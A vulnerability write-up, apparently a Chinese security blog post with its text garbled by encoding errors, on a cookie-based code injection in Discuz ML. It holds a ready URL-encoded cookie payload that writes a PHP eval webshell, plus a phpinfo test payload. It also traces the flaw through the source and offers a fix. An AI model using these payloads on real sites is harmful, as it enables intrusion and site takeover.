> æœ¬æ–‡ç”± [ç®€æ‚¦ SimpRead](http://ksria.com/simpread/) è½¬ç ï¼Œ åŸæ–‡åœ°å€ [y4er.com](https://y4er.com/post/discuz-ml-exec-code/)

æ˜¨å¤©æ™šä¸ŠDiscuz Mlçˆ†å‡ºäº†æ¼æ´ï¼Œä»Šå¤©æ¥åˆ†æä¸€æ³¢ã€‚

exp
---

ä¿®æ”¹Cookieä¸­çš„xxxx_languageå­—æ®µä¸ºä»¥ä¸‹å†…å®¹å³å¯

```
%27.+file_put_contents%28%27shell.php%27%2Curldecode%28%27%253c%253fphp+%2520eval%28%2524_%2547%2545%2554%255b%2522a1%2522%255d%29%253b%253f%253e%27%29%29.%27 
```

è®¿é—®ç½‘ç«™é¦–é¡µåˆ™ä¼šåœ¨æ ¹ç›®å½•ä¸‹ç”Ÿæˆæœ¨é©¬æ–‡ä»¶,shell.php å¯†ç ä¸ºa1

![20190711205534.png](https://ae01.alicdn.com/kf/UTB8_Dhrw9bIXKJkSaef761asXXaa.png)

å®šä½æ¼æ´ä½ç½®
------

è§£ç exp

```
'.+file_put_contents('shell.php',urldecode('<?php+ eval($_GET["a1"]);?>')).' 
```

ä¿®æ”¹expä¸º`_language=1.1.1;`ä½¿å…¶æŠ¥é”™ã€‚

![20190711210101.png](https://ae01.alicdn.com/kf/UTB8Hrllw__IXKJkSalU761BzVXat.png)

å®šä½åˆ°653è¡Œ

![20190711211456.png](https://ae01.alicdn.com/kf/UTB8TMXHw1vJXKJkSajh7637aFXaX.png)

å…³é”®ä»£ç 644è¡Œ

```
$cachefile = './data/template/'.DISCUZ_LANG.'_'.(defined('STYLEID') ? STYLEID.'_' : '_').$templateid.'_'.str_replace('/', '_', $file).'.tpl.php'; 
```

`cachefile`å˜é‡æ˜¯ç¼“å­˜æ–‡ä»¶ï¼Œå°†å…¶å†™å…¥åˆ°`/data/template/`ç›®å½•ä¸‹ï¼Œå¹¶ä¸”ç”±`DISCUZ_LANG`æ‹¼æ¥ï¼Œè¿½è¸ªä¸‹`DISCUZ_LANG`çš„å€¼ 2088-2096è¡Œ

```
global $_G;
if($_G['config']['output']['language'] == 'zh_cn') {
return 'SC_UTF8';
} elseif ($_G['config']['output']['language'] == 'zh_tw') {
return 'TC_UTF8';
} else {
//vot !!!! ToDo: Check this for other languages !!!!!!!!!!!!!!!!!!!!!
/*vot*/			return strtoupper(DISCUZ_LANG) . '_UTF8';
} 
```

å¯ä»¥çœ‹åˆ°`$_G['config']['output']['language']`ä½œä¸º`DISCUZ_LANG`çš„å€¼

å…¨å±€æœç´¢`['language']`

source/class/discuz/discuz_application.php 305è¡Œï¼Œå‘ç°æ˜¯ä»cookieä¸­æ‹¿åˆ°languageçš„å€¼

![20190711212635.png](https://ae01.alicdn.com/kf/UTB86WNtw9bIXKJkSaef761asXXaB.png)

é‚£ä¹ˆåˆ°è¿™é‡Œæ•´ä¸ªæ¼æ´çš„æµç¨‹å°±å¾ˆæ˜æ˜¾äº†ï¼Œcookieä¸­`language`å‚æ•°å¯æ§å¯¼è‡´`DISCUZ_LANG`å¯æ§ï¼Œä»è€Œå¯¼è‡´`cachefile`çš„æ–‡ä»¶åå¯è¢«æ³¨å…¥ä»£ç ï¼Œæœ€ç»ˆ`include_once`åŒ…å«ä¸€ä¸‹å¯¼è‡´äº†é€ æˆä»£ç æ‰§è¡Œã€‚

phpinfoéªŒè¯

`Ov1T_2132_language='.phpinfo().';`

![20190711214222.png](https://ae01.alicdn.com/kf/UTB8HphiwYnJXKJkSahG760hzFXaN.png)

ä¿®å¤å»ºè®®
----

æˆªæ­¢åˆ°æœ¬æ–‡å‘å¸ƒä¹‹å‰ï¼Œè¡¥ä¸è¿˜æ²¡æœ‰å‡ºæ¥ã€‚

å»ºè®®ä¿®æ”¹source/function/function_core.php 644è¡Œä¸º

```
/*vot*/	$cachefile = './data/template/'.'sc'.'_'.(defined('STYLEID') ? STYLEID.'_' : '_').$templateid.'_'.str_replace('/', '_', $file).'.tpl.php'; 
```

åˆ é™¤å¯æ§å˜é‡

å†™åœ¨æ–‡å
----

å…¶å®ä»æ¼æ´ç‚¹çš„æ³¨é‡Šä¸Šæ¥çœ‹å°±çŸ¥é“è¿™æ˜¯ä¸€ä¸ªæœªå®Œæˆçš„éƒ¨åˆ†ï¼Œæ¯•ç«Ÿè¿˜æ˜¯`TODO`ï¼Œå¼€å‘äººå‘˜å¾—èƒŒé”…ã€‚ä¸è¿‡æˆ‘æ€ä¹ˆæ²¡æœ‰è¿™ç§å¥½è¿æ°”å‘¢ï¼Œå‘œå‘œå‘œğŸ˜­